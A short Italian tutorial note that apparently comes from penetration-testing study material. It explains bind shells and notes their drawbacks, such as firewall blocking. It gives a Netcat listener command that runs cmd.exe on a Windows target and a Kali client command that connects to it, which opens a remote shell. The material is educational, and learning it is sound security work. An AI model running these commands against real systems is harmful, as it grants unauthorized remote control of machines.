
# Bind Shell
Una bind shell é un tipo di connessione remota dove un attaccante esegue una connessione diretta verso un target in ascolto per poi aprire successivamete una shell su quest'ultimo. <br>
Per poter eseguire questa tecnica su Netcat abbiamo bisogno che il target abbia un listener netcat in ascolto su una determianta porta e questo é un porblema se non abbiamo accesso diretto alla macchina target. <br>
un altro aspetto negativo delle bind shell é che sono facilmente bloccabili dai sistemi di sicurezza come firewalls. 

per poter configurare una bind shell abbiamo bisogno di avviare `cmd.exe` quando un client effettua una connessione sul target listener quindi usiamo l'opzione `-e`: 
```bash
#Windows Listener
nc -nvlp PORT -e cmd.exe
```
```bash
#Kali Linux Client
nc -nv IP PORT
```
dopo aver eseguito il comando su kali linux avremo una shell cmd aperta dato che abbiamo detto al listener windows di eseguire `cmd.exe` quando un client effettua una connessione verso qella determinata porta. <br>
